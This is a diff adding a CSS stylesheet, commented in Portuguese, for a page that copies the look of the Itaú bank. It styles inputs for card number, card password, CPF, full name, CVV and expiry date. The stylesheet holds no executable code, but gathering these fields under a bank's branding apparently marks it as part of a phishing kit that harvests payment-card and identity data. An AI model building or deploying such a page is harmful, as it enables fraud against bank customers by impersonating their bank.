@@ -1,0 +1,205 @@
+/* styles.css */
+
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background-color: #f5f5f5;
+    color: #fff; /* Cor padrão do texto */
+}
+
+.container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    background-image: url('images/img_home_bg.png');
+    background-size: cover;
+    background-position: center;
+}
+
+.logo {
+    margin-bottom: 20px;
+}
+
+.logo img {
+    width: 150px;
+}
+
+.login-box {
+    background-color: #eb6100; /* Laranja forte do Itaú */
+    padding: 20px;
+    border-radius: 10px;
+    width: 300px;
+    text-align: center;
+    color: #fff;
+    margin-bottom: 20px;
+    position: relative; /* Adicionado para posicionamento relativo */
+}
+
+.card-number-container,
+.personal-input {
+    position: relative;
+    width: 100%; /* Ocupa toda a largura disponível */
+}
+
+.card-number-container input,
+.personal-input input {
+    width: calc(100% - 40px); /* Ajustado para deixar espaço para o ícone */
+    padding: 10px;
+    margin: 10px 0;
+    border: none; /* Remove a borda */
+    border-bottom: 1px solid #fff; /* Adiciona apenas a borda inferior */
+    border-radius: 0; /* Remove o arredondamento */
+    font-size: 16px;
+    background-color: transparent; /* Fundo transparente */
+    box-sizing: border-box;
+    color: #fff; /* Texto branco */
+    outline: none; /* Remove o contorno padrão ao focar */
+    transition: border-color 0.3s ease; /* Transição suave para a cor da borda */
+    padding-right: 40px; /* Espaçamento para o ícone */
+    position: relative; /* Manter relativo para posição do ícone */
+}
+
+.card-number-container .camera-icon,
+.personal-input .camera-icon {
+    position: absolute;
+    right: 10px; /* Ajuste fino para o ícone */
+    top: 50%;
+    transform: translateY(-50%);
+    width: 30px; /* Tamanho do ícone aumentado para 30px */
+}
+
+.card-number-container input::placeholder,
+.personal-input input::placeholder {
+    color: #fff; /* Cor do texto de placeholder em branco */
+}
+
+.card-number-container input:focus,
+.personal-input input:focus {
+    border-color: #fff; /* Borda branca ao focar */
+}
+
+.password-label {
+    font-size: 16px;
+    margin-bottom: 5px;
+    text-align: left;
+    width: 100%;
+}
+
+.password-container {
+    display: flex;
+    justify-content: flex-start;
+    margin-top: 10px;
+    margin-bottom: 10px;
+}
+
+.password-container .password-input {
+    width: 15px; /* Reduz o tamanho dos círculos de senha */
+    height: 15px; /* Reduz o tamanho dos círculos de senha */
+    font-size: 8px; /* Reduz ainda mais o tamanho da fonte das bolinhas */
+    border: 1px solid #ccc;
+    border-radius: 50%;
+    text-align: center;
+    background-color: transparent;
+    -webkit-text-security: disc;
+    text-security: disc;
+    color: #fff;
+    margin: 0 2px; /* Reduz o espaçamento entre os inputs */
+    padding: 2px; /* Reduz o padding interno */
+}
+
+.login-box button {
+    width: 100%;
+    padding: 10px;
+    background-color: #fff;
+    border: none;
+    border-radius: 5px;
+    color: #7F7F7F;
+    font-size: 16px;
+    cursor: pointer;
+    margin-top: 20px;
+}
+
+.login-box button:hover {
+    background-color: #e0e0e0;
+}
+
+.icons {
+    display: flex;
+    justify-content: space-around;
+    margin-top: 20px;
+    width: 100%;
+    text-align: center;
+}
+
+.icon {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+.icon img {
+    width: 30px;
+    margin-bottom: 5px;
+}
+
+.icon p {
+    margin: 0;
+    font-size: 12px;
+}
+
+.personal-input {
+    width: calc(100% - 40px); /* Ajusta o tamanho dos campos */
+    padding: 10px;
+    margin: 10px 0;
+    border: none; /* Remove a borda */
+    border-bottom: 1px solid #fff; /* Adiciona apenas a borda inferior */
+    border-radius: 0; /* Remove o arredondamento */
+    font-size: 16px;
+    background-color: transparent; /* Fundo transparente */
+    box-sizing: border-box;
+    color: #fff; /* Texto branco */
+    outline: none; /* Remove o contorno padrão ao focar */
+    transition: border-color 0.3s ease; /* Transição suave para a cor da borda */
+    padding-right: 40px; /* Espaçamento para o ícone */
+    position: relative; /* Manter relativo para posição do ícone */
+}
+
+.personal-input::placeholder {
+    color: #fff; /* Cor do texto de placeholder em branco */
+}
+
+.personal-input:focus {
+    border-color: #fff; /* Borda branca ao focar */
+}
+
+.hidden {
+    display: none;
+}
+
+/* Ajustes para campos CPF, Nome Completo, CVV e Data de Validade */
+#cpf, #fullName, #cvv, #expiryDate {
+    width: calc(100% - 40px); /* Ajusta o tamanho dos campos */
+    padding: 10px;
+    margin: 10px 0;
+    border: none; /* Remove a borda */
+    border-bottom: 1px solid #fff; /* Adiciona apenas a borda inferior */
+    border-radius: 0; /* Remove o arredondamento */
+    font-size: 16px;
+    background-color: transparent; /* Fundo transparente */
+    box-sizing: border-box;
+    color: #fff; /* Texto branco */
+    outline: none; /* Remove o contorno padrão ao focar */
+    transition: border-color 0.3s ease; /* Transição suave para a cor da borda */
+    padding-right: 40px; /* Espaçamento para o ícone */
+    position: relative; /* Manter relativo para posição do ícone */
+}
+
+/* Estilo para texto dos campos CPF, Nome Completo, CVV e Data de Validade */
+#cpf::placeholder,
+#fullName::placeholder,
+#cvv::placeholder,
+#expiryDate::placeholder {
+    color: #fff; /* Cor do texto de placeholder em branco */
+}
